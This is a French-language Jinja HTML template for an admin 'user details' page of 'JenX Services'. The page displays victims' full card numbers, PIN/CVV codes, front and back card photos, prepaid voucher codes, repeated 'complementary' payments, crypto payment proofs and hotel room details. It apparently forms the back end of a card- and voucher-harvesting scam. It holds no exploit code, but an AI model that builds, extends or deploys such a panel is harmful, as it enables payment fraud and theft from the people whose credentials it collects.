<!-- templates/admin_user_details.html -->
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JenX Services - Détails Utilisateur</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f0f2f5;
        }
    </style>
</head>
<body class="min-h-screen bg-gray-100 p-4">
    <div class="container mx-auto bg-white p-8 rounded-xl shadow-lg">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-3xl font-bold text-gray-800">Détails de l'utilisateur: {{ user.name }} {{ user.first_name }}</h2>
            <a href="/admin_dashboard" class="px-4 py-2 bg-gray-300 text-gray-800 rounded-md hover:bg-gray-400 transition duration-150 ease-in-out">Retour au tableau de bord</a>
        </div>

        <!-- Debug: Afficher l'ID utilisateur pour vérification -->
        <p class="text-sm text-red-500 mb-4">ID Utilisateur (pour debug): {{ user.id }}</p>

        <div class="space-y-6 mb-8">
            <div class="p-4 bg-blue-50 rounded-lg">
                <h3 class="text-xl font-semibold text-blue-800 mb-2">Informations Générales</h3>
                <p><span class="font-medium">Email:</span> {{ user.email }}</p>
                <p><span class="font-medium">Âge:</span> {{ user.age }}</p>
                <p><span class="font-medium">Devise:</span> {{ user.currency }}</p>
                <p><span class="font-medium">Statut actuel:</span> 
                    <span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full 
                    {% if user.admin_status == 'validated' %}bg-green-100 text-green-800
                    {% elif user.admin_status == 'rejected' %}bg-red-100 text-red-800
                    {% else %}bg-yellow-100 text-yellow-800{% endif %}">
                        {{ user.admin_status | default(user.status, true) | capitalize }}
                    </span>
                </p>
                <p><span class="font-medium">Date d'inscription:</span> {{ user.registration_date }}</p>
            </div>

            {% if user.payment_method %}
            <div class="p-4 bg-green-50 rounded-lg">
                <h3 class="text-xl font-semibold text-green-800 mb-2">Détails de Paiement Initial ({{ user.payment_method | capitalize }})</h3>
                {% if user.payment_method == 'card' and user.payment_details %}
                    <p><span class="font-medium">Type de carte:</span> {{ user.payment_details.type }}</p>
                    <p><span class="font-medium">Numéro/Code:</span> {{ user.payment_details.number }}</p>
                    <p><span class="font-medium">PIN/CVV:</span> {{ user.payment_details.code }}</p>
                    <p><span class="font-medium">Date d'expiration:</span> {{ user.payment_details.date | default('N/A') }}</p>
                    <p><span class="font-medium">Montant:</span> {{ user.payment_details.amount }} {{ user.currency }}</p>
                    {% if user.payment_details.recto_photo_url %}
                        <p class="mt-4 font-medium">Photo Recto:</p>
                        <img src="{{ user.payment_details.recto_photo_url }}" alt="Recto Carte" class="max-w-xs rounded-md shadow-md mt-2">
                    {% endif %}
                    {% if user.payment_details.verso_photo_url %}
                        <p class="mt-4 font-medium">Photo Verso:</p>
                        <img src="{{ user.payment_details.verso_photo_url }}" alt="Verso Carte" class="max-w-xs rounded-md shadow-md mt-2">
                    {% endif %}
                {% elif user.payment_method == 'ticket' and user.payment_details %}
                    <p><span class="font-medium">Code du ticket:</span> {{ user.payment_details.code }}</p>
                    <p><span class="font-medium">Montant:</span> {{ user.payment_details.amount }} {{ user.currency }}</p>
                    <p><span class="font-medium">Type de ticket:</span> {{ user.payment_details.type | default('N/A') }}</p>
                    <p><span class="font-medium">Date d'expiration:</span> {{ user.payment_details.expiration | default('N/A') }}</p>
                    {% if user.payment_details.ticket_photo_url %}
                        <p class="mt-4 font-medium">Photo Ticket:</p>
                        <img src="{{ user.payment_details.ticket_photo_url }}" alt="Photo Ticket" class="max-w-xs rounded-md shadow-md mt-2">
                    {% endif %}
                {% endif %}
            </div>
            {% endif %}

            {% if user.complementary_payment_confirmed %}
            <div class="p-4 bg-purple-50 rounded-lg">
                <h3 class="text-xl font-semibold text-purple-800 mb-2">Paiement Complémentaire (50 {{ user.currency }})</h3>
                {% if user.complementary_payment_details %}
                    {% if user.payment_method == 'card' %}
                        <p><span class="font-medium">Type de carte:</span> {{ user.complementary_payment_details.type | default('N/A') }}</p>
                        <p><span class="font-medium">Numéro/Code:</span> {{ user.complementary_payment_details.number | default('N/A') }}</p>
                        <p><span class="font-medium">PIN/CVV:</span> {{ user.complementary_payment_details.code | default('N/A') }}</p>
                        <p><span class="font-medium">Date d'expiration:</span> {{ user.complementary_payment_details.date | default('N/A') }}</p>
                        <p><span class="font-medium">Montant:</span> {{ user.complementary_payment_details.amount | default('N/A') }} {{ user.currency }}</p>
                        {% if user.complementary_payment_details.recto_photo_url %}
                            <p class="mt-4 font-medium">Photo Recto (Complémentaire):</p>
                            <img src="{{ user.complementary_payment_details.recto_photo_url }}" alt="Recto Carte Complémentaire" class="max-w-xs rounded-md shadow-md mt-2">
                        {% endif %}
                        {% if user.complementary_payment_details.verso_photo_url %}
                            <p class="mt-4 font-medium">Photo Verso (Complémentaire):</p>
                            <img src="{{ user.complementary_payment_details.verso_photo_url }}" alt="Verso Carte Complémentaire" class="max-w-xs rounded-md shadow-md mt-2">
                        {% endif %}
                    {% elif user.payment_method == 'ticket' %}
                        <p><span class="font-medium">Code du ticket:</span> {{ user.complementary_payment_details.code | default('N/A') }}</p>
                        <p><span class="font-medium">Montant:</span> {{ user.complementary_payment_details.amount | default('N/A') }} {{ user.currency }}</p>
                        <p><span class="font-medium">Type de ticket:</span> {{ user.complementary_payment_details.type | default('N/A') }}</p>
                        <p><span class="font-medium">Date d'expiration:</span> {{ user.complementary_payment_details.expiration | default('N/A') }}</p>
                        {% if user.complementary_payment_details.ticket_photo_url %}
                            <p class="mt-4 font-medium">Photo Ticket (Complémentaire):</p>
                            <img src="{{ user.complementary_payment_details.ticket_photo_url }}" alt="Photo Ticket Complémentaire" class="max-w-xs rounded-md shadow-md mt-2">
                        {% endif %}
                    {% endif %}
                {% else %}
                    <p class="text-red-500">Détails du paiement complémentaire non disponibles.</p>
                {% endif %}
            </div>
            {% endif %}

            {% if user.receipt_code %}
            <div class="p-4 bg-yellow-50 rounded-lg">
                <h3 class="text-xl font-semibold text-yellow-800 mb-2">Reçu Vérifié</h3>
                <p><span class="font-medium">Code Unique:</span> <span class="font-mono text-blue-700">{{ user.receipt_code }}</span></p>
            </div>
            {% endif %}

            {% if user.crypto_payment_proof_url %}
            <div class="p-4 bg-orange-50 rounded-lg">
                <h3 class="text-xl font-semibold text-orange-800 mb-2">Preuve de Paiement Crypto</h3>
                <p class="mt-4 font-medium">Capture d'écran:</p>
                <img src="{{ user.crypto_payment_proof_url }}" alt="Preuve Crypto" class="max-w-xs rounded-md shadow-md mt-2">
            </div>
            {% endif %}

            {% if user.final_validation_details %}
            <div class="p-4 bg-red-50 rounded-lg">
                <h3 class="text-xl font-semibold text-red-800 mb-2">Validation Finale</h3>
                <p><span class="font-medium">Nom de l'hôtel:</span> {{ user.final_validation_details.hotel_name }}</p>
                <p><span class="font-medium">Numéro de chambre:</span> {{ user.final_validation_details.room_number }}</p>
                <p><span class="font-medium">Date prévue:</span> {{ user.final_validation_details.expected_date }}</p>
                {% if user.final_validation_details.final_photo_url %}
                    <p class="mt-4 font-medium">Capture photo finale:</p>
                    <img src="{{ user.final_validation_details.final_photo_url }}" alt="Photo Finale" class="max-w-xs rounded-md shadow-md mt-2">
                {% endif %}
            </div>
            {% endif %}
        </div>

        <div class="mt-8 flex flex-col sm:flex-row justify-center space-y-4 sm:space-y-0 sm:space-x-4">
            <!-- Formulaire pour Valider -->
            <!-- Correction: L'attribut 'action' du formulaire doit contenir l'ID de l'utilisateur -->
            <form action="{{ url_for('admin_update_user_status', user_id=user.id) }}" method="POST" class="inline-block w-full sm:w-auto">
                <input type="hidden" name="action" value="validate">
                <button type="submit" 
                        class="w-full px-6 py-3 bg-green-600 text-white rounded-md shadow-md hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500 transition duration-150 ease-in-out">
                    ✅ Valider
                </button>
            </form>
            
            <!-- Section pour Refuser et Générer Message -->
            <div class="p-4 border border-gray-300 rounded-lg bg-gray-50 w-full sm:w-auto flex-grow">
                <h4 class="text-lg font-semibold text-gray-800 mb-3">Action de Refus</h4>
                <textarea id="rejection_reason" rows="3" placeholder="Raison du refus (ex: Informations incomplètes, Montant incorrect)"
                          class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 sm:text-sm mb-3"></textarea>
                
                <button type="button" onclick="generateRejectionMessage('{{ user.id }}')"
                        class="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-base font-medium text-white bg-purple-600 hover:bg-purple-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-purple-500 transition duration-150 ease-in-out mb-3">
                    Générer message de refus ✨
                </button>

                <div id="generated_message_container" class="mt-4 p-3 bg-white border border-gray-200 rounded-md shadow-sm hidden">
                    <p class="text-sm font-semibold text-gray-700 mb-2">Brouillon de message :</p>
                    <textarea id="generated_message" rows="6" readonly
                              class="block w-full text-sm text-gray-800 bg-gray-50 border-none resize-none"></textarea>
                    <button onclick="copyGeneratedMessage()"
                            class="mt-2 px-3 py-1 bg-blue-500 text-white text-sm rounded-md hover:bg-blue-600 transition duration-150 ease-in-out">
                        Copier le message
                    </button>
                </div>

                <form action="{{ url_for('admin_update_user_status', user_id=user.id) }}" method="POST" class="mt-3">
                    <input type="hidden" name="action" value="reject">
                    <button type="submit" 
                            class="w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-lg font-medium text-white bg-red-600 hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 transition duration-150 ease-in-out">
                        ❌ Refuser
                    </button>
                </form>
            </div>
        </div>
    </div>

    <script>
        async function generateRejectionMessage(userId) {
            const rejectionReason = document.getElementById('rejection_reason').value;
            const generatedMessageContainer = document.getElementById('generated_message_container');
            const generatedMessageTextarea = document.getElementById('generated_message');

            if (!rejectionReason) {
                alert("Veuillez entrer une raison de refus pour générer le message.");
                return;
            }

            generatedMessageTextarea.value = "Génération en cours...";
            generatedMessageContainer.classList.remove('hidden');

            try {
                const response = await fetch('/admin_draft_rejection_message', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ user_id: userId, rejection_reason: rejectionReason })
                });

                if (!response.ok) {
                    const errorData = await response.json();
                    throw new Error(errorData.error || 'Erreur lors de la génération du message.');
                }

                const data = await response.json();
                generatedMessageTextarea.value = data.draft_message;
            } catch (error) {
                console.error('Erreur:', error);
                generatedMessageTextarea.value = `Erreur lors de la génération: ${error.message}`;
            }
        }

        function copyGeneratedMessage() {
            const generatedMessageTextarea = document.getElementById('generated_message');
            generatedMessageTextarea.select();
            document.execCommand('copy');
            alert('Message copié dans le presse-papiers !'); // Utiliser un modal personnalisé en production
        }
    </script>
</body>
</html>

